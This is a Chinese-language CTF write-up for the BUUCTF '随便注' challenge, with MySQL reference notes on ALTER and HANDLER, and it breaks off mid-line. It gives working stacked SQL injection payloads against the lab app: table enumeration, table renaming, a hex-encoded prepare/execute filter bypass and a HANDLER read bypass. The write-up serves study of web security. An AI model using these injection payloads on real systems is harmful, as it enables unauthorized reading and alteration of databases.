{"title":"buuctf靶场wp","uid":"d85793a4128cf3cc353119248e4d44d8","slug":"wp-buuctf","date":"2022-06-21T14:06:24.391Z","updated":"2023-08-06T08:01:10.360Z","comments":true,"path":"api/articles/wp-buuctf.json","keywords":null,"cover":"/img/32.jpg","content":"<p><code>web各个方面选择了一些题目进行学习，感觉还是得第一次就应该看通彻，不应该留有问题，能够明白原理和代码中哪出造成这个的原因，反复嚼剩饭感觉浪费时间</code></p>\n<span id=\"more\"></span>\n\n<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"1-强网杯-2019-随便注\"><a href=\"#1-强网杯-2019-随便注\" class=\"headerlink\" title=\"1.[强网杯 2019]随便注\"></a>1.[强网杯 2019]随便注</h2><h3 id=\"1）题目描述\"><a href=\"#1）题目描述\" class=\"headerlink\" title=\"1）题目描述\"></a>1）题目描述</h3><p>无</p>\n<h3 id=\"2）wp\"><a href=\"#2）wp\" class=\"headerlink\" title=\"2）wp\"></a>2）wp</h3><p>因为之前没有了解过堆叠注入，这里挨个分析学习</p>\n<p>先来确定sql注入</p>\n<figure class=\"highlight matlab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs matlab\"><span class=\"hljs-number\">1</span>&#x27;<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220701113045499.png\" alt=\"image-20220701113045499\"></p>\n<p>然后试试显示所有数据，感觉看不到什么意思，后面一步步分析</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">1</span>&#x27; or <span class=\"hljs-number\">1</span>=<span class=\"hljs-number\">1</span>;#<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220702105520465.png\" alt=\"image-20220702105520465\"></p>\n<p>然后判断字段</p>\n<p><img src=\"/post/wp-buuctf/image-20220701113210998.png\" alt=\"image-20220701113210998\"></p>\n<p><img src=\"/post/wp-buuctf/image-20220701113228972.png\" alt=\"image-20220701113228972\"></p>\n<p>判断处字段数为2</p>\n<p>然后用<strong>联合注入</strong></p>\n<p><img src=\"/post/wp-buuctf/image-20220701113604165.png\" alt=\"image-20220701113604165\"></p>\n<p>发现select被正则匹配过滤了，用大小写绕过也不行，所以只能换一种方法</p>\n<p>可以先了解<a href=\"../../../../2022/05/28/Web-study\">堆叠注入</a>的概念和注入方式</p>\n<h4 id=\"堆叠注入\"><a href=\"#堆叠注入\" class=\"headerlink\" title=\"堆叠注入\"></a><strong>堆叠注入</strong></h4><p>先查看所有的数据库</p>\n<p><code>注：这里仍然要查询数据为假，比如-1，不然就不会执行后面的sql语句</code></p>\n<p><code>;间隔sql语句</code></p>\n<figure class=\"highlight gauss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gauss\"><span class=\"hljs-number\">-1</span>&#x27;;<span class=\"hljs-keyword\">show</span> databases;<span class=\"hljs-meta\">#</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220701224154901.png\" alt=\"image-20220701224154901\"></p>\n<p>根据题目名字，先调用supersqli这个库的表看看</p>\n<figure class=\"highlight gauss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gauss\"><span class=\"hljs-number\">-1</span>&#x27;;<span class=\"hljs-keyword\">use</span> supersqli;<span class=\"hljs-keyword\">show</span> tables;<span class=\"hljs-meta\">#</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220701222551203.png\" alt=\"image-20220701222551203\"></p>\n<p>看到有两个表，先看一下纯数字的表里的内容</p>\n<p> <strong><u>注：当纯数字字符串是表名的时候需要加反引号&#96;</u></strong></p>\n<figure class=\"highlight gauss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gauss\"><span class=\"hljs-number\">-1</span>&#x27;;<span class=\"hljs-keyword\">use</span> supersqli;<span class=\"hljs-keyword\">show</span> columns from`<span class=\"hljs-number\">1919810931114514</span>`;<span class=\"hljs-meta\">#</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220701224603433.png\" alt=\"image-20220701224603433\"></p>\n<p>看到flag在里面，再看看words里</p>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\"><span class=\"hljs-number\">-1</span>&#x27;;use supersqli;show columns <span class=\"hljs-keyword\">from</span> <span class=\"hljs-built_in\">words</span>;<span class=\"hljs-comment\">#</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220701233450179.png\" alt=\"image-20220701233450179\"></p>\n<p><code>VARCHAR(M)是一种比CHAR更加灵活的数据类型，同样用于表示字符数据，但是VARCHAR可以保存可变长度的字符串</code></p>\n<p>这里猜测，因为flag是字符串，所以猜测输入框查询的就是words表</p>\n<p>后台sql语句可能（xx为输入框的内容）</p>\n<p><code>select id,data from words where id=xx</code></p>\n<hr>\n<p>更改表名列名</p>\n<p>1，通过 rename 先把 words 表改名为其他的表名。</p>\n<p>2，把 1919810931114514 表的名字改为 words 。</p>\n<p>3 ，将修改后的 words 表中flag列名改成列名 id ，这样只需进行正常查询就会按上面猜测后台sql语句一样显示出flag</p>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\"><span class=\"hljs-number\">-1</span>&#x27;;rename table `<span class=\"hljs-built_in\">words</span>` <span class=\"hljs-keyword\">to</span> words2;rename table `<span class=\"hljs-number\">1919810931114514</span>` <span class=\"hljs-keyword\">to</span> <span class=\"hljs-built_in\">words</span>;alter table <span class=\"hljs-built_in\">words</span> change flag <span class=\"hljs-built_in\">id</span> varchar(<span class=\"hljs-number\">100</span>);show tables;<span class=\"hljs-comment\">#</span><br></code></pre></td></tr></table></figure>\n\n<p><code>show tables</code>主要看看改成功没有，这里改表名要有顺序，如果先改数字表，那就出现两个words表，导致语句不能执行，所以需要先改words表名为其他名字，然后修改数字表为words；避免因为名字而发生命令冲突</p>\n<p><img src=\"/post/wp-buuctf/image-20220702220112706.png\" alt=\"image-20220702220112706\"></p>\n<p>可以看到表<code>1919810931114514</code>名字被改成了可查询表<code>words</code></p>\n<p>再看看words表的列，flag变成了id，NO变成了YES</p>\n<p><img src=\"/post/wp-buuctf/image-20220702220308651.png\" alt=\"image-20220702220308651\"></p>\n<p>因为flag为id了，用<code>1&#39; or 1=1;#</code>恒真测试使其回显</p>\n<p>看看回显数据</p>\n<p><img src=\"/post/wp-buuctf/image-20220702221617795.png\" alt=\"image-20220702221617795\"></p>\n<p>得到flag</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"><span class=\"hljs-keyword\">SQl</span>的<span class=\"hljs-keyword\">rename</span><br>用于重命名表名<br><br><br><span class=\"hljs-keyword\">SQL</span>的<span class=\"hljs-keyword\">alter</span>用法总结<br><br><span class=\"hljs-number\">1</span>：删除列<br><br><span class=\"hljs-keyword\">ALTER</span> <span class=\"hljs-keyword\">TABLE</span> 表名 <span class=\"hljs-keyword\">DROP</span> <span class=\"hljs-keyword\">COLUMN</span> 列名<br><br><span class=\"hljs-number\">2</span>：增加列<br><br><span class=\"hljs-keyword\">ALTER</span> <span class=\"hljs-keyword\">TABLE</span> 表名 <span class=\"hljs-keyword\">ADD</span> <span class=\"hljs-keyword\">COLUMN</span> 列名 属性 【约束】<br><br><span class=\"hljs-number\">3</span>：修改列的类型信息<br><br><span class=\"hljs-keyword\">ALTER</span> <span class=\"hljs-keyword\">TABLE</span> 表名 CHANGE <span class=\"hljs-keyword\">COLUMN</span> 列名 【新】列名<br>新属性<br><span class=\"hljs-number\">4</span>：重命名列<br><br><span class=\"hljs-keyword\">ALTER</span> <span class=\"hljs-keyword\">TABLE</span> 表名字 CHANGE <span class=\"hljs-keyword\">COLUMN</span> 列名 新列名 属性<br><br><span class=\"hljs-number\">5</span>：重命名表<br><br><span class=\"hljs-keyword\">ALTER</span> <span class=\"hljs-keyword\">TABLE</span> 表名 <span class=\"hljs-keyword\">RENAME</span> <span class=\"hljs-keyword\">TO</span> 表新名<br><br><span class=\"hljs-number\">6</span>：删除表中主键<br><br><span class=\"hljs-keyword\">Alter</span> <span class=\"hljs-keyword\">TABLE</span> 表名 <span class=\"hljs-keyword\">DROP</span> <span class=\"hljs-keyword\">primary key</span><br><br><span class=\"hljs-number\">7</span>：添加主键<br><br><span class=\"hljs-keyword\">ALTER</span> <span class=\"hljs-keyword\">TABLE</span> 表名 <span class=\"hljs-keyword\">ADD</span> <span class=\"hljs-keyword\">CONSTRAINT</span> 约束名 <span class=\"hljs-keyword\">PRIMARY KEY</span> (添加列)<br><br><span class=\"hljs-number\">8</span>：添加索引<br><br><span class=\"hljs-keyword\">ALTER</span> <span class=\"hljs-keyword\">TABLE</span> 表名 <span class=\"hljs-keyword\">ADD</span> <span class=\"hljs-keyword\">index</span> 索引名 (列名);<br><br><span class=\"hljs-number\">9</span>：修改列的属性<br><span class=\"hljs-keyword\">ALTER</span> <span class=\"hljs-keyword\">TABLE</span> 表名 MODIFY <span class=\"hljs-keyword\">COLUMN</span> 要修改属性的列名 新属性;<br><br>一般情况下，不推荐在建表后对表进行大幅度修改，大幅度修改极有可能使表数据丢失。<br></code></pre></td></tr></table></figure>\n\n<p>–</p>\n<p>看了其他大佬的wp，这里补充两种方法</p>\n<p><a href=\"https://blog.csdn.net/qq_44657899/article/details/103239145\">原文链接</a></p>\n<h4 id=\"解题思路2：预处理绕过select限制\"><a href=\"#解题思路2：预处理绕过select限制\" class=\"headerlink\" title=\"解题思路2：预处理绕过select限制\"></a><strong>解题思路2：<a href=\"https://so.csdn.net/so/search?q=%E9%A2%84%E5%A4%84%E7%90%86&spm=1001.2101.3001.7020\">预处理</a>绕过select限制</strong></h4><p>因为select被过滤了，所以先将</p>\n<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\"><span class=\"hljs-keyword\">select</span> * <span class=\"hljs-keyword\">from</span> <span class=\"hljs-symbol\">` 1919810931114514 `</span><br></code></pre></td></tr></table></figure>\n\n<p>进行16进制编码</p>\n<p>再通过构造payload得</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\">;<span class=\"hljs-keyword\">SeT</span><span class=\"hljs-variable\">@a</span><span class=\"hljs-operator\">=</span><span class=\"hljs-number\">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class=\"hljs-keyword\">prepare</span> execsql <span class=\"hljs-keyword\">from</span> <span class=\"hljs-variable\">@a</span>;<span class=\"hljs-keyword\">execute</span> execsql;#<br></code></pre></td></tr></table></figure>\n\n<p>进而得到flag</p>\n<pre><code>prepare…from…是预处理语句，会进行编码转换。\nexecute用来执行由SQLPrepare创建的SQL语句。\nSELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。\n</code></pre>\n<p><img src=\"/post/wp-buuctf/image-20230503173612612.png\" alt=\"image-20230503173612612\"></p>\n<h4 id=\"解题思路3：handler绕过\"><a href=\"#解题思路3：handler绕过\" class=\"headerlink\" title=\"解题思路3：handler绕过\"></a><strong>解题思路3：<a href=\"https://so.csdn.net/so/search?q=handler&spm=1001.2101.3001.7020\">handler</a>绕过</strong></h4><p>payload：</p>\n<figure class=\"highlight julia\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs julia\"><span class=\"hljs-number\">1</span>&#x27;; handler <span class=\"hljs-string\">`1919810931114514`</span> open as <span class=\"hljs-string\">`a`</span>; handler <span class=\"hljs-string\">`a`</span> read next;<span class=\"hljs-comment\">#</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20230503173624567.png\" alt=\"image-20230503173624567\"></p>\n<h5 id=\"handler基本用法\"><a href=\"#handler基本用法\" class=\"headerlink\" title=\"handler基本用法\"></a>handler基本用法</h5><figure class=\"highlight gradle\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gradle\">HANDLER tbl_name OPEN [ [AS] alias]<br><br>HANDLER tbl_name <span class=\"hljs-keyword\">READ</span> index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)<br>    [ WHERE where_condition ] [LIMIT ... ]<br>HANDLER tbl_name <span class=\"hljs-keyword\">READ</span> index_name &#123; FIRST | <span class=\"hljs-keyword\">NEXT</span> | PREV | LAST &#125;<br>    [ WHERE where_condition ] [LIMIT ... ]<br>HANDLER tbl_name <span class=\"hljs-keyword\">READ</span> &#123; FIRST | <span class=\"hljs-keyword\">NEXT</span> &#125;<br>    [ WHERE where_condition ] [LIMIT ... ]<br>    <br>HANDLER tbl_name CLOSE<br><br>通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。<br>通过HANDLER tbl_name <span class=\"hljs-keyword\">READ</span> FIRST获取句柄的第一行，通过<span class=\"hljs-keyword\">READ</span> <span class=\"hljs-keyword\">NEXT</span>依次获取其它行。最后一行执行之后再执行<span class=\"hljs-keyword\">NEXT</span>会返回一个空的结果。<br>通过HANDLER tbl_name CLOSE来关闭打开的句柄。<br><br>通过索引去查看的话可以按照一定的顺序，获取表中的数据。<br>通过HANDLER tbl_name <span class=\"hljs-keyword\">READ</span> index_name FIRST，获取句柄第一行（索引最小的一行），<span class=\"hljs-keyword\">NEXT</span>获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。<br><br>通过索引列指定一个值，可以指定从哪一行开始。<br>通过HANDLER tbl_name <span class=\"hljs-keyword\">READ</span> index_name = value，指定从哪一行开始，通过<span class=\"hljs-keyword\">NEXT</span>继续浏览。<br></code></pre></td></tr></table></figure>\n\n\n\n<p><u><code>句柄：【相当于一个指针，这里是指向数据库里的表】</code></u></p>\n<h5 id=\"实例\"><a href=\"#实例\" class=\"headerlink\" title=\"实例\"></a>实例</h5><figure class=\"highlight asciidoc\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs asciidoc\">3.1 创建测试表及测试数据<br><br>create table handler<span class=\"hljs-emphasis\">_table(  </span><br><span class=\"hljs-emphasis\">    c1 int,   </span><br><span class=\"hljs-emphasis\">    c2 varchar(10),   </span><br><span class=\"hljs-emphasis\">    c3 int(10) </span><br><span class=\"hljs-emphasis\">);  </span><br><span class=\"hljs-emphasis\">insert into handler_table values(2, &#x27;name2&#x27;, 002);  </span><br><span class=\"hljs-emphasis\">insert into handler_table values(5, &#x27;name5&#x27;, 005);  </span><br><span class=\"hljs-emphasis\">insert into handler_table values(1, &#x27;name1&#x27;, 001);  </span><br><span class=\"hljs-emphasis\">insert into handler_table values(4, &#x27;name4&#x27;, 004);  </span><br><span class=\"hljs-emphasis\">insert into handler_</span>table values(3, <span class=\"hljs-emphasis\">&#x27;name3&#x27;</span>, 003);<br><br>3.2 不通过索引打开查看表<br><br>打开句柄：【相当于一个指针】<br><br>mysql&gt; handler handler_table open;<br><br>查看表数据：<br><br><span class=\"hljs-section\">mysql&gt; handler handler_table read first;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    2 | name2 |    2 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler handler_table read next;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    5 | name5 |    5 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler handler_table read next;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    1 | name1 |    1 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler handler_table read next;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    4 | name4 |    4 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler handler_table read next;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    3 | name3 |    3 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br>mysql&gt; handler handler_table read next;<br>Empty set (0.00 sec)<br><br><br>关闭句柄：<br><br>mysql&gt; handler handler_table close;<br>Query OK, 0 rows affected (0.00 sec)<br><br>3.3 通过索引打开查看表（FIRST,NEXT,PREV,LAST）<br>通过索引查看的话，可以按照索引的升序，从小到大，查看表信息。<br><br>创建索引：<br><br>mysql&gt; create index handler_index on handler_table(c1);<br><br>打开句柄：<br><br>mysql&gt; handler handler_table open as p;<br><br>查看表数据：<br><br><span class=\"hljs-section\">mysql&gt; handler p read handler_index first;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    1 | name1 |    1 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler p read handler_index next;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    2 | name2 |    2 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler p read handler_index next;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    3 | name3 |    3 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler p read handler_index next;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    4 | name4 |    4 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler p read handler_index next;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    5 | name5 |    5 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler p read handler_index prev;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    4 | name4 |    4 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler p read handler_index last;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    5 | name5 |    5 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><br><br><br>关闭句柄：<br><br>mysql&gt; handler p close;<br><br>3.4 通过索引打开查看表（=,&lt;=,&gt;=,&lt;,&gt;）<br>从index为2的地方开始<br><br>打开句柄：<br><br>mysql&gt; handler handler_table open as p;<br><br>查看表数据：<br><br><span class=\"hljs-section\">mysql&gt; handler p read handler_index = (2);</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    2 | name2 |    2 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler p read handler_index next;     </span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    3 | name3 |    3 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler p read handler_index next;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    4 | name4 |    4 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler p read handler_index next;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    5 | name5 |    5 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler p read handler_index last;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    5 | name5 |    5 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><br>关闭句柄：<br><br>mysql&gt; handler p close;<br><br>3.5 附加：语法实例参考<br><br>handler handler<span class=\"hljs-emphasis\">_table open;</span><br><span class=\"hljs-emphasis\">handler handler_table open as p;</span><br><span class=\"hljs-emphasis\">handler handler_table read first;</span><br><span class=\"hljs-emphasis\">handler handler_table read next;</span><br><span class=\"hljs-emphasis\">handler handler_table read first limit 3;</span><br><span class=\"hljs-emphasis\">handler handler_table read next limit 3,3;</span><br><span class=\"hljs-emphasis\">handler handler_table read first where c1 &gt; 2 